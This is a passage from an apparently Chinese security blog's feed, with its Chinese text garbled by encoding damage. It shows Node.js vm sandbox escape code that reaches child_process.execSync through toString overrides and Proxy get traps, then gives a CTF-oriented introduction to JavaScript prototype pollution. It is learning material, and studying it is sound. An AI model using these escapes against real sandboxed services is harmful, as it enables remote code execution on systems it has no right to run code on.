p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    return a</span><br><span class="hljs-string">  &#125;)()`</span>;<br><br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<span class="hljs-comment">//resæ˜¯ä¸€ä¸ªæ¶æ„å¯¹è±¡</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello &#x27;</span> + res)<span class="hljs-comment">//åœ¨è¿™é‡Œè°ƒç”¨äº†é‡å†™çš„toStringæ–¹æ³•</span><br><br><span class="hljs-comment">//Hello v1per3\rdj</span><br><span class="hljs-comment">//() =&gt; &#123; ... &#125; è¿™ç§å½¢å¼è¡¨ç¤ºä¸€ä¸ªæ²¡æœ‰å‚æ•°çš„ç®­å¤´å‡½æ•°ï¼Œç®­å¤´å‡½æ•°å¯ä»¥ç”¨æ¥å®šä¹‰åŒ¿åå‡½æ•°ï¼Œå®ƒçš„è¯­æ³•æ¯”ä¼ ç»Ÿçš„å‡½æ•°å®šä¹‰æ›´åŠ ç®€æ´ã€‚</span><br></code></pre></td></tr></table></figure><p>è§£é‡Šä¸‹è¿™ä¸ªæ–¹æ³•ï¼šå…ˆå¯¹<code>toString</code>æ–¹æ³•è¿›è¡Œäº†é‡å†™(é‡å†™ä¸æ”¹å˜æ–¹æ³•ä½•æ—¶è¢«è°ƒç”¨)ã€‚<code>console.log(&#39;Hello &#39; + res)</code>æ—¶(ä¸€ä¸ªå¯¹è±¡ä¸å­—ç¬¦ä¸²å‘ç”Ÿäº†<code>å…³ç³»</code>)ï¼Œå°±ä¼šè°ƒç”¨<code>toString</code>æ–¹æ³•ã€‚(æ„Ÿè§‰æœ‰ç‚¹åƒPHPä¸­çš„é­”æœ¯æ–¹æ³•)</p><p>åœ¨ <code>toString</code> æ–¹æ³•ä¸­ï¼Œé€šè¿‡ <code>arguments.callee.caller</code> è·å–åˆ°è°ƒç”¨<strong>è¯¥æ–¹æ³•çš„å‡½æ•°</strong>çš„å¼•ç”¨ï¼Œå¹¶åˆ©ç”¨è¯¥å¼•ç”¨è·å–åˆ° <code>process</code> å¯¹è±¡ï¼Œç„¶åä½¿ç”¨ <code>child_process</code> æ¨¡å—çš„ <code>execSync</code> æ–¹æ³•æ‰§è¡Œå‘½ä»¤ <code>whoami</code>ï¼Œå¹¶å°†ç»“æœè½¬æ¢ä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚å®ç°äº†<code>RCE</code></p><p>å½“ç„¶ï¼Œæœ‰æ—¶å³ä½¿æˆ‘ä»¬é‡å†™äº†<code>toString</code>å‡½æ•°ï¼Œä½†æ²™ç®±å¤–å¹¶ä¸å­˜åœ¨å»è§¦å‘è¯¥å‡½æ•°çš„ç›¸å…³æ“ä½œæˆ–æ ¹æœ¬ä¸èƒ½é‡å†™å‡½æ•°ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥ç”¨<code>Proxy</code>æ¥åŠ«æŒå±æ€§ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<span class="hljs-comment">//å¯¼å…¥vmæ¨¡å—</span><br><br><span class="hljs-keyword">const</span> script = <br><span class="hljs-string">`</span><br><span class="hljs-string">(() =&gt;&#123; //</span><br><span class="hljs-string">    const a = new Proxy(&#123;&#125;, &#123; //ä»£ç†äº†ç©ºå¯¹è±¡å¹¶å¯¹getæ–¹æ³•è¿›è¡Œé‡å†™ï¼Œä»£ç†å¯¹è±¡æ˜¯æŒ‡é€šè¿‡ä½¿ç”¨ES6ä¸­çš„Proxyå¯¹è±¡æ¥åŒ…è£…å¦ä¸€ä¸ªå¯¹è±¡ï¼Œä»è€Œå¯ä»¥æ‹¦æˆªå¹¶é‡å®šä¹‰è¯¥å¯¹è±¡çš„åŸºæœ¬æ“ä½œï¼ˆæ¯”å¦‚å±æ€§æŸ¥æ‰¾ã€èµ‹å€¼ã€åˆ é™¤ç­‰ï¼‰ã€‚ä»£ç†å¯¹è±¡å…è®¸æˆ‘ä»¬åœ¨å¯¹ç›®æ ‡å¯¹è±¡è¿›è¡Œæ“ä½œæ—¶ï¼Œå¯ä»¥è‡ªå®šä¹‰å¹¶æ·»åŠ é¢å¤–çš„è¡Œä¸ºã€‚</span><br><span class="hljs-string">        get: function()&#123;</span><br><span class="hljs-string">            const cc = arguments.callee.caller;</span><br><span class="hljs-string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;)</span><br><span class="hljs-string">    return a</span><br><span class="hljs-string">&#125;)()//è¿™ä¸ª()ä¸ºäº†è°ƒç”¨åŒ¿åå‡½æ•°</span><br><span class="hljs-string">`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">abc</span>)<br></code></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« ï¼š</p><p><code>https://xz.aliyun.com/t/11859</code></p><p><code>https://blog.csdn.net/m0_62422842/article/details/128553953</code></p><p><code>[Proxy å’Œ Reflect - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/6844904090116292616)</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆè¯†JavaScriptåŸå‹é“¾æ±¡æŸ“</title>
    <link href="/2023/10/22/2023-10-22-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/10/22/2023-10-22-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>0xGameç¢°åˆ°äº†åŸå‹é“¾æ±¡æŸ“çš„é¢˜ï¼Œè®°å½•ä¸€ä¸‹å­¦ä¹ è¿‡ç¨‹</p><span id="more"></span><hr><p>å› ä¸ºç¬¬ä¸€æ¬¡æ¥è§¦ï¼Œæ‰€ä»¥å…ˆäº†è§£äº†<code>Javascript</code>è¿™ä¸œè¥¿çš„ç‰¹æ€§ï¼Œå…ˆçœ‹ä¸€æ®µç®€å•çš„æ„é€ ç±»çš„æ–¹æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-comment">//åä¸ºpersonçš„æ„é€ å‡½æ•°ï¼Œæ„é€ å‡½æ•°ç”¨äºåˆ›å»ºæ‹¥æœ‰ç‰¹å®šå±æ€§/æ–¹æ³•çš„å¯¹è±¡</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>=<span class="hljs-string">&quot;rendongjun&quot;</span>;<span class="hljs-comment">//nameå±æ€§</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">test</span>=<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123; <span class="hljs-comment">//testæ–¹æ³•ï¼Œè¿”å› 333</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">333</span>;<br><br>&#125;<br>&#125;<br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">a</span>=<span class="hljs-number">3</span>;<span class="hljs-comment">//é€šè¿‡åŸå‹ç»§æ‰¿çš„æ–¹å¼ï¼Œç»™Personæ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡æ·»åŠ äº†ä¸€ä¸ªåä¸ºaçš„å±æ€§ï¼Œå…¶å€¼ä¸º3</span><br>web=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<span class="hljs-comment">//åˆ›å»ºåä¸ºwebçš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ˜¯é€šè¿‡personæ„é€ å‡½æ•°åˆ›å»ºçš„ä¸€ä¸ªå®ä¾‹ï¼Œæ„é€ å‡½æ•°ä½¿ç”¨newè°ƒç”¨</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(web.<span class="hljs-title function_">test</span>());<span class="hljs-comment">//ä½¿ç”¨consoleå‡½æ•°è¿›è¡Œæ‰“å°</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(web.<span class="hljs-property">a</span>)<br></code></pre></td></tr></table></figure><h6 id="ä»€ä¹ˆæ˜¯åŸå‹ç»§æ‰¿ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯åŸå‹ç»§æ‰¿ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸå‹ç»§æ‰¿ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯åŸå‹ç»§æ‰¿ï¼Ÿ</h6><p>æ¯ä¸ªJavaScriptå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ™®é€šçš„å¯¹è±¡ï¼ŒåŒ…å«äº†ä¸€äº›å…±äº«çš„å±æ€§å’Œæ–¹æ³•ã€‚å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨ç»§æ‰¿åŸå‹å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ã€‚</p><p>åœ¨JavaScriptä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹åŸå‹å¯¹è±¡æ¥å®ç°å±æ€§å’Œæ–¹æ³•çš„ç»§æ‰¿ã€‚</p><p><code>Person.prototype.a = 3</code>è¿™æ®µä»£ç å°±æ˜¯åœ¨<code>Person</code>æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ä¸Šæ·»åŠ äº†ä¸€ä¸ªåä¸º<code>a</code>çš„å±æ€§ï¼Œå…¶å€¼ä¸º3ã€‚è¿™æ„å‘³ç€é€šè¿‡<code>Person</code>æ„é€ å‡½æ•°åˆ›å»ºçš„æ‰€æœ‰å¯¹è±¡å®ä¾‹éƒ½ä¼šç»§æ‰¿è¿™ä¸ª<code>a</code>å±æ€§ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡å¯¹è±¡å®ä¾‹è®¿é—®å’Œä½¿ç”¨å®ƒã€‚</p><p>æ¢å¥è¯è¯´ï¼Œå½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª<code>person</code>å¯¹è±¡å®ä¾‹ï¼Œæ¯”å¦‚<code>web = new person()</code>ï¼Œè¿™ä¸ªå®ä¾‹ä¼šç»§æ‰¿<code>person</code>æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ä¸Šçš„å±æ€§å’Œæ–¹æ³•ã€‚å› æ­¤ï¼Œ<code>web</code>å¯¹è±¡å¯ä»¥è®¿é—®å’Œä½¿ç”¨<code>a</code>å±æ€§ï¼Œå³<code>web.a</code>ä¼šè¿”å›3ã€‚</p><p><code>__proto__</code>å±æ€§æŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°çš„<code>prototype</code>å±æ€§ã€‚</p><h6 id="ä»€ä¹ˆæ˜¯åŸå‹é“¾ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯åŸå‹é“¾ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸå‹é“¾ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯åŸå‹é“¾ï¼Ÿ</h6><p>åŸå‹é“¾æ˜¯JavaScriptä¸­ä¸€ç§å¯¹è±¡ä¹‹é—´çš„å…³ç³»æ¨¡å‹ï¼Œå®ƒç”¨äºå®ç°å¯¹è±¡çš„ç»§æ‰¿å’Œå±æ€§æŸ¥æ‰¾ã€‚</p><p>åœ¨JavaScriptä¸­ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼ˆprototypeï¼‰ï¼ŒåŸå‹å¯¹è±¡ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒåŒ…å«äº†ä¸€äº›å…±äº«çš„å±æ€§å’Œæ–¹æ³•ã€‚å½“æˆ‘ä»¬è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æˆ–æ–¹æ³•æ—¶ï¼Œå¦‚æœè¯¥å¯¹è±¡æœ¬èº«æ²¡æœ‰è¿™ä¸ªå±æ€§æˆ–æ–¹æ³•ï¼ŒJavaScriptä¼šæ²¿ç€åŸå‹é“¾å‘ä¸ŠæŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°è¯¥å±æ€§æˆ–æ–¹æ³•æˆ–è€…åˆ°è¾¾åŸå‹é“¾çš„é¡¶ç«¯ï¼ˆå³Object.prototypeï¼‰ã€‚</p><p>åŸå‹é“¾çš„å…³ç³»å¯ä»¥é€šè¿‡å¯¹è±¡çš„<code>__proto__</code>å±æ€§æ¥è¡¨ç¤ºã€‚æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ª<code>__proto__</code>å±æ€§ï¼Œå®ƒæŒ‡å‘è¯¥å¯¹è±¡çš„åŸå‹å¯¹è±¡ã€‚åŸå‹å¯¹è±¡ä¹Ÿæœ‰è‡ªå·±çš„åŸå‹å¯¹è±¡ï¼Œè¿™æ ·å°±å½¢æˆäº†ä¸€ä¸ªé“¾å¼ç»“æ„ï¼Œå³åŸå‹é“¾ã€‚</p><p><img src="/img/pol1.png" alt="pol1"></p><h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><p>æ¯ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª <code>constructor</code> å±æ€§æŒ‡å‘å¯¹åº”çš„<strong>æ„é€ å‡½æ•°</strong>ï¼Œå³ç±»ã€‚æ‰€ä»¥ä»¥ä¸‹å‡ ç§å†™æ³•å…¶å®æ˜¯ç›¸ç­‰çš„ï¼Œéƒ½è¿”å› <code>Foo</code> ç±»çš„åŸå‹å¯¹è±¡ã€‚</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-type">Foo</span>.proto<span class="hljs-keyword">type</span><br><span class="hljs-title">foo</span>[<span class="hljs-string">&quot;__proto__&quot;</span>]<br><span class="hljs-title">foo</span>.__proto__<br><span class="hljs-title">foo</span>.constructor.proto<span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure><p>å¤§æ®µå¤§æ®µçš„æ–‡å­—æ€»æ˜¯è®©äººå¤´ç–¼ï¼Œå†™ä¸ªç®€å•ä»£ç ä½“ä¼šä¸€ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>)&#123;&#125;;<br><span class="hljs-literal">undefined</span><br><span class="hljs-keyword">let</span> foo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>();<br><span class="hljs-literal">undefined</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> == foo.<span class="hljs-property">__proto__</span> <span class="hljs-comment">//fooå¯¹è±¡çš„__proto__å±æ€§ç­‰äºFoo.prototype</span><br><span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><img src="/img/nodejs1.png" alt="nodejs1"></p><p>ä»¥åŠ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Donald&#x27;</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&#x27;Trump&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Melania&#x27;</span><br>&#125;<br><br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()<br><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>()<br>son.<span class="hljs-property">__proto__</span>[<span class="hljs-string">&#x27;add_name&#x27;</span>] = <span class="hljs-string">&#x27;abc&#x27;</span><br><span class="hljs-keyword">let</span> son1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`son Name: <span class="hljs-subst">$&#123;son.add_name&#125;</span>`</span>)<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`son1 Name: <span class="hljs-subst">$&#123;son.add_name&#125;</span>`</span>)<br><br><span class="hljs-comment">//ç»“æœï¼š son Name: abc</span><br><span class="hljs-comment">//son1 Name: abc</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ˜æ˜åªä¿®æ”¹äº†<code>son</code>å¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼Œä½†ç”±äºæœ‰å…¶å®ƒå¯¹è±¡çš„åŸå‹å±æ€§æŒ‡å‘äº†ç›¸åŒçš„åŸå‹å±æ€§(å³<code>son1.__proto__</code>ä¸å…¶ç›¸åŒ)ï¼Œå¯¼è‡´å¦å¤–ä¸€ä¸ªå…·æœ‰ç›¸åŒåŸå‹çš„å¯¹è±¡ä¹Ÿå—åˆ°äº†å½±å“ã€‚</p><p>å†çœ‹ä¸€æ®µ<code>js</code>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡</span><br><span class="hljs-keyword">let</span> foo = &#123;<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>&#125;<br> <br><span class="hljs-comment">// foo.bar æ­¤æ—¶ä¸º1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br> <br><span class="hljs-comment">// ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰ï¼Œfooæ˜¯ä¸€ä¸ªObjectç±»çš„å®ä¾‹ï¼Œå®é™…ä¸Šæ˜¯ä¿®æ”¹äº†Objectç±»ï¼Œç»™å…¶å¢åŠ äº†ä¸€ä¸ªå±æ€§bar,å€¼ä¸º2</span><br>foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">2</span><br> <br><span class="hljs-comment">// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br> <br><span class="hljs-comment">// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡ï¼Œä»–ä¼šæœ‰ä¸€ä¸ªbarå±æ€§</span><br><span class="hljs-keyword">let</span> zoo = &#123;&#125;<br> <br><span class="hljs-comment">// æŸ¥çœ‹zoo.bar</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(zoo.<span class="hljs-property">bar</span>)<br><span class="hljs-comment">//æœ€åï¼Œè™½ç„¶zooæ˜¯ä¸€ä¸ªç©ºå¯¹è±¡&#123;&#125;ï¼Œä½†zoo.barçš„ç»“æœå±…ç„¶æ˜¯2ï¼š</span><br><span class="hljs-comment">//å‚è€ƒï¼šhttps://blog.csdn.net/qq_51586883/article/details/119867720</span><br></code></pre></td></tr></table></figure><p>å†é€šè¿‡ä¸€æ®µä»£ç åŠ æ·±åŠ æ·±å°è±¡ :</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;D&#x27;</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&#x27;K&#x27;</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;A&#x27;</span><br>&#125;<br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>() <span class="hljs-comment">//Foo &#123; first_name: &#x27;D&#x27;, last_name: &#x27;K&#x27; &#125;</span><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>() <span class="hljs-comment">//Foo &#123; first_name: &#x27;A&#x27; &#125;</span><br>son.<span class="hljs-property">last_name</span> <span class="hljs-comment">// &#x27;K&#x27;</span><br><span class="hljs-comment">//æ³¨æ„ï¼Œæ­¤æ—¶Son.prototype=son.__proto__</span><br><br>son.<span class="hljs-property">__proto__</span>  <span class="hljs-comment">//Foo &#123; first_name: &#x27;Donald&#x27;, last_name: &#x27;Trump&#x27; &#125;</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property">add_name</span>=<span class="hljs-string">&#x27;viper&#x27;</span><br>son.<span class="hljs-property">add_name</span> <span class="hljs-comment">//undefined</span><br><span class="hljs-title class_">Son</span>.<span class="hljs-property">add_name</span> <span class="hljs-comment">//undefinedï¼Œæ„é€ å‡½æ•°çš„å±æ€§å’Œæ–¹æ³•è¦é€šè¿‡åˆ›å»ºå®ä¾‹æ‰èƒ½è®¿é—®</span><br><span class="hljs-title class_">Foo</span> <span class="hljs-comment">//[Function: Foo] &#123; add_name: &#x27;viper&#x27; &#125;,æ³¨æ„è¿™é‡Œè§£é‡Šäº†ä¸ºå•¥Son/son.add_nameæ²¡å®šä¹‰</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[<span class="hljs-string">&#x27;add_name&#x27;</span>]=<span class="hljs-string">&#x27;notbad&#x27;</span><span class="hljs-comment">//æ³¨æ„è¿™é‡Œ</span><br>son.<span class="hljs-property">add_name</span><span class="hljs-comment">//&#x27;notbad&#x27;</span><br><span class="hljs-title class_">Son</span>.<span class="hljs-property">add_name</span><span class="hljs-comment">//undefinedï¼ŒåŒä¸Š</span><br><br><span class="hljs-title class_">JavaScript</span> çš„æŸ¥æ‰¾æœºåˆ¶å¦‚ä¸‹ï¼š<br><br>åœ¨å¯¹è±¡sonä¸­å¯»æ‰¾last_name<br>å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨son.<span class="hljs-property">__proto__</span>ä¸­å¯»æ‰¾last_name<br>å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨son.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>ä¸­å¯»æ‰¾last_name<br>ä¾æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°<span class="hljs-literal">null</span>ç»“æŸã€‚æ¯”å¦‚ï¼Œ<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> çš„ __proto__å°±æ˜¯ <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆï¼Œåœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚</p><p>æ€»ç»“ä¸€ä¸‹ï¼š</p><p>1.æ„é€ å‡½æ•°.prototypeæŒ‡å‘çš„æ˜¯ä¸€ä¸ªå¯¹è±¡(åŸå‹)ã€‚</p><p>2.ä»»ä½•å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼Œè¿™ä¸ªåŸå‹å¯¹è±¡ç”±å¯¹è±¡çš„å†…ç½®å±æ€§__proto__æŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°çš„prototypeæŒ‡å‘çš„å¯¹è±¡ï¼Œå³ä»»ä½•å¯¹è±¡éƒ½æ˜¯ç”±ä¸€ä¸ªæ„é€ å‡½æ•°åˆ›å»ºçš„ã€‚</p><p>3.åªæœ‰æ„é€ å‡½æ•°å†…æ‰æœ‰ptorotypeå±æ€§ã€‚</p><p>4.æ¯ä¸ªå¯¹è±¡éƒ½å†…å«æœ‰ä¸€ä¸ªå±æ€§ï¼š<strong>proto</strong>,ä¹Ÿå°±æ˜¯è¯´å°±ç®—å¯¹è±¡é‡Œé¢æ²¡æœ‰å¯¹è¿™ä¸ªå±æ€§è¿›è¡Œèµ‹å€¼ï¼Œé‚£ä¹ˆä¹Ÿæ˜¯æœ‰è¿™ä¸ªå±æ€§çš„ã€‚</p><p>5.åŸå‹é“¾çš„æ ¸å¿ƒå°±æ˜¯ä¾èµ–å¯¹è±¡__proto__çš„æŒ‡å‘ï¼Œå½“è®¿é—®çš„å±æ€§åœ¨è¯¥å¯¹è±¡ä¸å­˜åœ¨æ—¶ï¼Œå°±ä¼šå‘ä¸Šä»è¯¥å¯¹è±¡æ„é€ 